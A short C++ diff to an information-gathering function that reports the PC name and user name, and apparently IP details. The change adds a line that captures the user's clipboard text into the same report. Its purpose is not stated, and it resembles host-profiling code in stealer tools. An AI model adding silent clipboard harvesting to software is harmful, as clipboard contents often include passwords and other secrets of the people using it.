@@ -41,6 +41,7 @@ void Info::writePCInfo(std::stringstream &ss) {
     ss << "User:\n";
     ss << "  PC: " << acPcName << "\n";
     ss << "  NAME: " << acUserName << "\n";
+    ss << "  CLIPBOARD: " << OSUtil::getClipboardText() << "\n";
 }
 
 void Info::writeIPInfo(std::stringstream &ss) {
